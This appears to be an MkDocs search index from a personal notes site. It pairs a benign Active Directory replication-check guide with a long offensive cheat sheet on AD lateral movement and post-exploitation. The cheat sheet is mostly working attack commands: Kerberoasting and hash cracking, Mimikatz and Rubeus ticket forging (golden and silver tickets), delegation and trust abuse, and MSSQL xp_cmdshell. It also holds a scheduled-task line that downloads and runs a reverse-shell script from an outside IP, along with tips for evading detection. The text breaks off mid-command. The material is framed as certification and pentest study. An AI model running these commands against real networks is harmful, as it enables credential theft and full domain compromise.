{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Obsidian Notes","text":"<p>Publish your public notes with MkDocs</p>"},{"location":"#hello-world","title":"Hello World!","text":"<p>The <code>index.md</code> in the <code>/docs</code> folder is the homepage you see here.</p> <p>The folders in <code>/docs</code> appear as the main sections on the navigation bar.</p> <p>The notes appear as pages within these sections. For example, [[Note 1]] in <code>Topic 1</code></p>"},{"location":"AD%20Rep%20Check/","title":"AD Rep Check","text":""},{"location":"AD%20Rep%20Check/#step-1-check-the-replication-health","title":"Step 1 - Check the replication health","text":"<p>Run the following command : Repadmin /replsummary</p> <p>The \u201c/replsummary\u201d operation quickly summarizes replication state and relative health of a forest.</p> <p></p>"},{"location":"AD%20Rep%20Check/#step-2-check-the-inbound-replication-requests-that-are-queued","title":"Step 2 - Check the inbound replication requests that are queued.","text":"<p>Repadmin /Queue</p> <p>This command lists elements that are remaining in the replication queue. It displays inbound replication requests that the Domain Controller needs to issue in order to become consistent with its source replication partners.</p> <p></p>"},{"location":"AD%20Rep%20Check/#step-3-check-the-replication-status","title":"Step 3 - Check the replication status","text":"<p>Repadmin /Showrepl</p> <p>This command displays the replication status when the specified domain controller last attempted to implement an inbound replication of Active Directory partitions. It helps in figuring out the replication topology and replication failure.</p> <p></p>"},{"location":"AD%20Rep%20Check/#step-4-synchronize-replication-between-replication-partners","title":"Step 4 - Synchronize replication between replication partners","text":"<p>Repadmin /syncall</p> <p>It ensures synchronization between replication partners</p>"},{"location":"AD%20Rep%20Check/#step-5-force-the-kcc-to-recalculate-the-topology","title":"Step 5 - Force the KCC to recalculate the topology","text":"<p>Repadmin /KCC</p> <p>This command forces the KCC (Knowledge Consistency Checker) on targeted domain controller(s) to immediately recalculate its inbound replication topology. It checks and creates the connections between the Domain Controllers. By default KCC runs in the background every 15 minutes to check if a new connection has been established between DCs.</p> <p></p>"},{"location":"AD%20Rep%20Check/#step-6-force-replication","title":"Step 6 - Force replication","text":"<p>Repadmin /replicate</p> <p>This command forces the replication of the specified directory partition to the destination domain controller from the source DC.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/","title":"AD lateral movement & Post exploitation","text":"<p>This is a detailed cheat sheet to help you with many high end certifications like CRTE, OSEP, and definitely OSCP and beyond.</p> <p>Table of Contents</p> <p>Lateral Movement</p> <p>Lateral Movement Enumeration With PowerView BloodHound Kerberoasting AS-REP roasting Token Manipulation Lateral Movement with Rubeus Lateral Movement with Mimikatz Command execution with scheduled tasks Command execution with WMI Command execution with PowerShell Remoting Unconstrained delegation Constrained delegation Resource-based constrained delegation Abusing domain trust Abusing inter-forest trust Abusing MSSQL databases for lateral movement Abusing Group Policy Objects for lateral movement</p> <p>Post-Exploitation</p> <p>LSASS protection Dumping OS credentials with Mimikatz Abusing the Data Protection API (DPAPI) with Mimikatz Dumping secrets without Mimikatz Windows Defender evasion Chisel proxying Interesting Files</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#lateral-movement","title":"Lateral Movement","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#lateral-movement-enumeration-with-powerview","title":"Lateral Movement Enumeration With PowerView","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#find-existing-local-admin-access-for-user-noisy","title":"Find existing local admin access for user (noisy \ud83d\udea9)","text":"<p>Find-LocalAdminAccess# Hunt for sessions of interesting users on machines where you have access (also noisy \ud83d\udea9) Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }# Look for kerberoastable users Get-DomainUser -SPN | select name,serviceprincipalname# Look for AS-REP roastable users Get-DomainUser -PreauthNotRequired | select name# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#exploitation-depends-on-the-identified-acl-some-techniques-are-discussed-in-this-cheat-sheet","title":"Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#example-for-genericwrite-on-user-disable-preauth-or-add-spn-for-targeted-kerberoast-see-below","title":"Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)","text":"<p>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"UserOrGroupToQuery\"}# Look for servers with Unconstrained Delegation enabled  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#if-available-and-you-have-admin-privs-on-this-server-get-user-tgt-see-below","title":"If available and you have admin privs on this server, get user TGT (see below)","text":"<p>Get-DomainComputer -Unconstrained# Look for users or computers with Constrained Delegation enabled  </p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#if-available-and-you-have-usercomputer-hash-access-service-machine-as-da-see-below","title":"If available and you have user/computer hash, access service machine as DA (see below)","text":"<p>Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#bloodhound","title":"BloodHound","text":"<p>Use\u00a0<code>Invoke-BloodHound</code>\u00a0from\u00a0<code>SharpHound.ps1</code>, or use\u00a0<code>SharpHound.exe</code>. Both can be run reflectively, get them\u00a0here. Examples below use the PowerShell variant but arguments are identical.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#run-all-checks-including-restricted-groups-enforced-through-the-domain","title":"Run all checks, including restricted groups enforced through the domain  \ud83d\udea9","text":"<p>Invoke-BloodHound -CollectionMethod All,GPOLocalGroup# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy \ud83d\udea9 Invoke-BloodHound -CollectionMethod LoggedOn</p> <p>PowerShell</p> <p>For real engagements definitely look into the\u00a0various arguments\u00a0that BloodHound provides for more stealthy collection and exfiltration of data.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#kerberoasting","title":"Kerberoasting","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#automatic","title":"Automatic","text":"<p>With PowerView:</p> <p>Get-DomainSPNTicket -SPN \"MSSQLSvc/sqlserver.targetdomain.com\"</p> <p>PowerShell</p> <p>Crack the hash with Hashcat:</p> <p>hashcat -a 0 -m 13100 hash.txt <code>pwd</code>/rockyou.txt --rules-file <code>pwd</code>/hashcat/rules/best64.rule</p> <p>Bash</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#manual","title":"Manual","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#request-tgs-for-kerberoastable-account-spn","title":"Request TGS for kerberoastable account (SPN)","text":"<p>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/sqlserver.targetdomain.com\"# Dump TGS to disk Invoke-Mimikatz -Command '\"kerberos::list /export\"'# Crack with TGSRepCrack python.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt .\\mssqlsvc.kirbi</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#targeted-kerberoasting-by-setting-spn","title":"Targeted kerberoasting by setting SPN","text":"<p>We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:</p> <p>Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#as-rep-roasting","title":"AS-REP roasting","text":"<p>Get the hash for a roastable user (see above for hunting). Using\u00a0<code>ASREPRoast.ps1</code>:</p> <p>Get-ASREPHash -UserName TargetUser</p> <p>PowerShell</p> <p>Crack the hash with Hashcat:</p> <p>hashcat -a 0 -m 18200 hash.txt <code>pwd</code>/rockyou.txt --rules-file <code>pwd</code>/hashcat/rules/best64.rule</p> <p>Bash</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication","title":"Targeted AS-REP roasting by disabling Kerberos pre-authentication","text":"<p>Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:</p> <p>Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#token-manipulation","title":"Token Manipulation","text":"<p>Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the \u2018Steal Token\u2019 functionality in Cobalt Strike).</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#incognito","title":"Incognito","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#show-tokens-on-the-machine","title":"Show tokens on the machine","text":"<p>.\\incognito.exe list_tokens -u# Start new process with token of a specific user .\\incognito.exe execute -c \"domain\\user\" C:\\Windows\\system32\\calc.exe</p> <p>PowerShell</p> <p>If you\u2019re using Meterpreter, you can use the built-in Incognito module with <code>_use incognito_</code>, the same commands are available.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#invoke-tokenmanipulation","title":"Invoke-TokenManipulation","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#show-all-tokens-on-the-machine","title":"Show all tokens on the machine","text":"<p>Invoke-TokenManipulation -ShowAll# Show only unique, usable tokens on the machine Invoke-TokenManipulation -Enumerate# Start new process with token of a specific user Invoke-TokenManipulation -ImpersonateUser -Username \"domain\\user\"# Start new process with token of another process Invoke-TokenManipulation -CreateProcess \"C:\\Windows\\system32\\calc.exe\" -ProcessId 500</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#lateral-movement-with-rubeus","title":"Lateral Movement with Rubeus","text":"<p>We can use Rubeus to execute a technique called \u201cOverpass-the-Hash\u201d. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#request-a-tgt-as-the-target-user-and-pass-it-into-the-current-session","title":"Request a TGT as the target user and pass it into the current session","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#note-make-sure-to-clear-tickets-in-the-current-session-with-klist-purge-to-ensure-you-dont-have-multiple-active-tgts","title":"NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs","text":"<p>.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section) .\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation) .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe</p> <p>PowerShell</p> <p>Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#lateral-movement-with-mimikatz","title":"Lateral Movement with Mimikatz","text":"<p>Note that Mimikatz is incredibly versatile and is discussed in multiple sections throughout this blog. Because of this, however, the binary is also very well-detected. If you need to run Mimikatz on your target (not recommended), executing a custom version reflectively is your best bet. There are also options such as\u00a0Invoke-MimiKatz\u00a0or\u00a0Safetykatz. Note that the latter is more stealthy but does not include all functionality.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#overpass-the-hash-more-risky-than-rubeus-writes-to-lsass-memory","title":"Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)","text":"<p>sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe# Golden ticket (domain admin, w/ some ticket properties to avoid detection) kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# Silver ticket for a specific SPN with a compromised service / machine account kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</p> <p>Plaintext</p> <p>A nice overview of the SPNs relevant for offensive purposes is provided here (scroll down) and here.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#command-execution-with-scheduled-tasks","title":"Command execution with scheduled tasks","text":"<p>Requires \u2018Host\u2019 SPN</p> <p>To create a task:</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#mind-the-quotes-use-encoded-commands-if-quoting-becomes-too-much-of-a-pain","title":"Mind the quotes. Use encoded commands if quoting becomes too much of a pain","text":"<p>schtasks /create /tn \"shell\" /ru \"NT Authority\\SYSTEM\" /s dc.targetdomain.com /sc weekly /tr \"Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'\"</p> <p>PowerShell</p> <p>To trigger the task:</p> <p>schtasks /RUN /TN \"shell\" /s dc.targetdomain.com</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#command-execution-with-wmi","title":"Command execution with WMI","text":"<p>Requires \u2018Host\u2019 and \u2018RPCSS\u2019 SPNs</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#from-windows","title":"From Windows","text":"<p>Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist \"powershell.exe -e $encodedCommand\"</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#from-linux","title":"From Linux","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#with-password","title":"with password","text":"<p>impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101# with hash impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a7796fb1006e7dc594# with Kerberos authentication (make sure your client is setup to use the right ticket, and that you have a TGS with the right SPNs) impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k</p> <p>Bash</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#command-execution-with-powershell-remoting","title":"Command execution with PowerShell Remoting","text":"<p>Requires \u2018CIFS\u2019 and \u2018HTTP\u2019 SPNs. May also need the \u2018WSMAN\u2019 or \u2018RPCSS\u2019 SPNs (depending on OS version)</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#create-credential-to-run-as-another-user-not-needed-after-eg-overpass-the-hash","title":"Create credential to run as another user (not needed after e.g. Overpass-the-Hash)","text":""},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#leave-out-credential-cred-in-the-below-commands-to-run-as-the-current-user-instead","title":"Leave out -Credential $Cred in the below commands to run as the current user instead","text":"<p>$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\targetuser', $SecPassword)# Run a command remotely (can be used on multiple machines at once) Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}# Launch a session as another user (prompt for password instead, for use with e.g. RDP) Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt $sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com Invoke-Command -Session $sess -FilePath c:\\path\\to\\file.ps1 Enter-PsSession -Session $sess# Copy files to or from an active PowerShell remoting session Copy-Item -Path .\\Invoke-Mimikatz.ps1 -ToSession $sess -Destination \"C:\\Users\\public\\\"</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#unconstrained-delegation","title":"Unconstrained delegation","text":"<p>Unconstrained Delegation can be set on a\u00a0frontend service\u00a0(e.g., an IIS web server) to allow it to delegate on behalf of a user to\u00a0any service in the domain\u00a0(towards a\u00a0backend service, such as an MSSQL database).</p> <p>DACL UAC property:\u00a0<code>TrustedForDelegation</code>.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#exploitation","title":"Exploitation","text":"<p>With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.</p> <p>With Mimikatz:</p> <p>sekurlsa::tickets /export kerberos::ptt c:\\path\\to\\ticket.kirbi</p> <p>Plaintext</p> <p>Or with Rubeus:</p> <p>.\\Rubeus.exe triage .\\Rubeus.exe dump /luid:0x5379f2 /nowrap .\\Rubeus.exe ptt /ticket:doIFSDCC[...]</p> <p>PowerShell</p> <p>We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.</p> <p>On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.</p> <p>.\\Rubeus.exe monitor /interval:5 /nowrap</p> <p>PowerShell</p> <p>From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from\u00a0here.</p> <p>.\\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com</p> <p>PowerShell</p> <p>The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).</p> <p>.\\Rubeus.exe ptt /ticket:doIFxTCCBc...</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#constrained-delegation","title":"Constrained delegation","text":"<p>Constrained delegation can be set on the\u00a0frontend server\u00a0(e.g. IIS) to allow it to delegate to\u00a0only selected backend services\u00a0(e.g. MSSQL) on behalf of the user.</p> <p>DACL UAC property:\u00a0<code>TrustedToAuthForDelegation</code>. This allows\u00a0<code>s4u2self</code>, i.e. requesting a TGS on behalf of\u00a0anyone\u00a0to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn\u2019t used between the user and frontend.</p> <p>DACL Property:\u00a0<code>msDS-AllowedToDelegateTo</code>. This property contains the SPNs it is allowed to use\u00a0<code>s4u2proxy</code>\u00a0on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using\u00a0<code>s4u2self</code>). This effectively defines the backend services that constrained delegation is allowed for.</p> <p>NOTE:\u00a0These properties do NOT have to exist together! If\u00a0<code>s4u2proxy</code>\u00a0is allowed without\u00a0<code>s4u2self</code>, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#exploitation_1","title":"Exploitation","text":"<p>In this case, we use Rubeus to automatically request a TGT and then a TGS with the\u00a0<code>ldap</code>\u00a0SPN to allow us to DCSync using a machine account.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#get-a-tgt-using-the-compromised-service-account-with-delegation-set-not-needed-if-you-already-have-an-active-session-or-token-as-this-user","title":"Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)","text":"<p>.\\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN .\\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync) .\\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#resource-based-constrained-delegation","title":"Resource-based constrained delegation","text":"<p>Resource-Based Constrained Delegation (RBCD) configures the\u00a0backend server\u00a0(e.g. MSSQL) to allow\u00a0only selected frontend services\u00a0(e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.</p> <p>DACL Property:\u00a0<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p> <p>In this scenario,\u00a0<code>s4u2self</code>\u00a0and\u00a0<code>s4u2proxy</code>\u00a0are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the\u00a0frontend service) is present in the\u00a0<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>\u00a0property of the\u00a0backend service. This means that the\u00a0frontend service\u00a0needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#exploitation_2","title":"Exploitation","text":"<p>If we compromise a\u00a0frontend service\u00a0that appears in the RBCD property of a\u00a0backend service, exploitation is the same as with constrained delegation above. This is however not too common.</p> <p>A more often-seen attack to RBCD is when we have\u00a0<code>GenericWrite</code>,\u00a0<code>GenericAll</code>,\u00a0<code>WriteProperty</code>, or\u00a0<code>WriteDACL</code>\u00a0permissions to a computer object in the domain. This means we can write the\u00a0<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>\u00a0property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#create-a-new-machine-account-using-powermad","title":"Create a new machine account using PowerMad","text":"<p>New-MachineAccount -MachineAccount NewMachine -Password \\((ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target   (sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid \\(SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\\)(\\)sid))\" \\(SDbytes = New-Object byte[] (\\)SD.BinaryLength) \\(SD.GetBinaryForm(\\)SDbytes,0)# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target   Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=\\)SDBytes}# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target .\\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt</p> <p>PowerShell</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#abusing-domain-trust","title":"Abusing domain trust","text":"<p>All commands must be run with DA privileges in the current domain.</p> <p>Note that if you completely compromise a child domain (<code>currentdomain.targetdomain.com</code>), you can\u00a0by definition\u00a0also compromise the parent domain (<code>targetdomain.com</code>) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see\u00a0\u2018Abusing inter-forest trust\u2019\u00a0below).</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#using-domain-trust-key","title":"Using domain trust key","text":"<p>From the DC, dump the hash of the\u00a0<code>currentdomain\\targetdomain$</code>\u00a0trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain\u2019s enterprise admins group to our \u2018SID history\u2019.</p> <p>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\\users\\public\\ticket.kirbi</p> <p>Plaintext</p> <p>Pass this ticket with Rubeus.</p> <p>.\\Rubeus.exe asktgs /ticket:c:\\users\\public\\ticket.kirbi /service:LDAP/dc.targetdomain.com /dc:dc.targetdomain.com /ptt</p> <p>PowerShell</p> <p>We can now DCSync the target domain (see below).</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#using-krbtgt-hash","title":"Using krbtgt hash","text":"<p>From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.</p> <p>Doing this requires the SID of the current domain as the\u00a0<code>/sid</code>\u00a0parameter, and the SID of the target domain as part of the\u00a0<code>/sids</code>\u00a0parameter. You can grab these using PowerView\u2019s\u00a0<code>Get-DomainSID</code>. Use a SID History (<code>/sids</code>) of\u00a0<code>*-516</code>\u00a0and\u00a0<code>S-1-5-9</code>\u00a0to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.</p> <p>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt</p> <p>Plaintext</p> <p>If you are having issues creating this ticket, try adding the \u2019target\u2019 flag, e.g. <code>_/target:targetdomain.com_</code>.</p> <p>Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.</p> <p>kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt</p> <p>We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#abusing-inter-forest-trust","title":"Abusing inter-forest trust","text":"<p>Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:</p> <p>Get-DomainForeignGroupMember -domain targetdomain.com</p> <p>PowerShell</p> <p>In some cases, it is possible that SID filtering (the protection causing the above), is\u00a0disabled\u00a0between forests. If you run\u00a0<code>Get-DomainTrust</code>\u00a0and you see the\u00a0<code>TREAT_AS_EXTERNAL</code>\u00a0property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can\u00a0NOT\u00a0forge a ticket for any SID between 500 and 1000 though, so you can\u2019t become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to\u00a0this blog post.</p> <p>To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in\u00a0\u2018Using domain trust key\u2019\u00a0above.</p> <p>Use Mimikatz to generate a TGT for the target domain using the trust key:</p> <p>Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi</p> <p>Plaintext</p> <p>Then, use Rubeus to ask a TGS for e.g. the\u00a0<code>CIFS</code>\u00a0service on the target DC using this TGT.</p> <p>.\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt</p> <p>PowerShell</p> <p>Now we can use the CIFS service on the target forest\u2019s DC as the DA of our source domain (again, as long as this trust was configured to exist).</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#abusing-mssql-databases-for-lateral-movement","title":"Abusing MSSQL databases for lateral movement","text":"<p>MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (<code>sa</code>\u00a0maybe? ). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.</p> <p>-- Find linked servers EXEC sp_linkedservers-- Run SQL query on linked server select mylogin from openquery(\"TARGETSERVER\", 'select SYSTEM_USER as mylogin')-- Enable 'xp_cmdshell' on remote server and execute commands, only works if RPC is enabled EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER</p> <p>SQL</p> <p>We can also use\u00a0PowerUpSQL\u00a0to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).</p>"},{"location":"AD%20lateral%20movement%20%26%20Post%20exploitation/#get-mssql-databases-in-the-domain-and-test-connectivity","title":"Get MSSQL databases in the domain, and test connectivity","text":"<p>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft# Try to get information on all domain databases Get-SQLInstanceDomain | Get-SQLServerInfo# Get information on a single reachable database Get-SQLServerInfo -Instance TARGETSERVER# Scan for MSSQL misconfigurations to escalate to SA Invoke-SQLAudit -Verbose -Instance TARGETSERVER# Execute SQL query Get-SQLQuery -Query \"SELECT system_user\" -Instance TARGETSERVER# Run command (enables XP_CMDSHELL automatically if required) Invoke-SQLOSCmd -Instance TARGETSERVER -Command \"whoami\" |  select -ExpandProperty CommandResults# Automatically find all linked databases Get-SqlServerLinkCrawl -Instance TARGETSERVER | select instance,links | ft# Run command if XP_CMDSHELL is enabled on any of the linked databases Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell \"whoami\"' | select 